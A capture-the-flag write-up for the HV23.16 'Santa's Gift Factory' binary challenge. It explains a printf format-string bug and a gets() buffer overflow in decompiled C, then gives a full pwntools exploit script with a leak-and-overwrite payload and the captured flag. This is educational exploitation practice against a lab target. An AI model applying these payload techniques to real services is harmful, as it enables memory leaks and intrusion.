# [HV23.16] Santa's Gift Factory

## Introduction

Difficulty: Hard<br>
Author: Fabi_07

Did you know that Santa has its own factory for making gifts? Maybe you can exploit it to get your own special gift!

## Solution

Looking at the program, it first asks us if we want to help santa with counting the presents, we answer `y` which gives us a task to count t he red, yellow and blue presents. Afterwards it asks for our name and if there's anything else he can assist us with.

```c
void tellflag(void)
{
  int iVar1;
  size_t sVar2;
  undefined local_ae [6];
  char local_a8 [136];
  undefined8 local_20;
  int local_14;
  FILE *local_10;
  
  local_10 = fopen("flag","r");
  if (local_10 == (FILE *)0x0) {
    error("Opening flag file failed!!! Please contact the admins.");
  }
  sVar2 = fread(local_ae,1,5,local_10);
  local_14 = (int)sVar2;
  local_ae[local_14] = 0;
  iVar1 = fclose(local_10);
  if (iVar1 < 0) {
    error("Closing flag file failed!!! Please contact the admins.");
  }
  system("./magic.sh");
  local_20 = getstr("Santa: One last thing, can you tell me your name?");
  printf("\nSanta: Let me see. Oh no, this is bad, the flag vanished before i could read it entirely . All I can give you is this: %s. I am very sorry about this and would like to apologise for the i nconvenience.\n"
         ,local_ae);
  gets("\nSanta: Can I assist you with anything else?",local_a8);
  printf("\nSanta: You want me to help you with ");
  printf(local_a8);
  puts("?\nSanta: I will see what I can do...");
  return;
}
```

We can see why it only prints the first few characters of the flag, because after reading it into memory, it sets the last byte to a null-byte, the flag pointer still remains on the stack though.

We can see inside the `tellflag` function, we have a `printf` vulnerability, which lets us leak memory. In addition, we have a buffer overflow because of `gets` reading into `local_a8` which has a fixed size of `136`. We can exploit this together with the format string to read the flag pointer from the stack while overwriting the pointer itself with `0x84` instead of `0x80` to "jump" over the nullbyte which terminates the flag.

```py
from pwn import *

rem = remote('152.96.15.2', 1337)
rem.recvuntil(b"? \x1b[?25h")
rem.sendline(b"y")
rem.recvuntil(b"\n\n")
presents = rem.recvuntil(b"\n\n")

red = presents.count(b"red")
yellow = presents.count(b"yellow")
blue = presents.count(b"blue")

rem.recvuntil(b"\n > ")
rem.sendline(f"{red}".encode())
rem.recvuntil(b"\n > ")
rem.sendline(f"{yellow}".encode())
rem.recvuntil(b"\n > ")
rem.sendline(f"{blue}".encode())
rem.recvuntil(b"name?\n > \x1b[?25h")
rem.sendline(b"A")
rem.recvuntil(b"else?\n > \x1b[?25h")
rem.sendline(b"%25$s" + b"A"*131 + b"\x84")

print(rem.recvall())
```

Flag: `HV23{roses_are_red_violets_are_blue_the_bufferoverfl0w_is_0n_line_32}`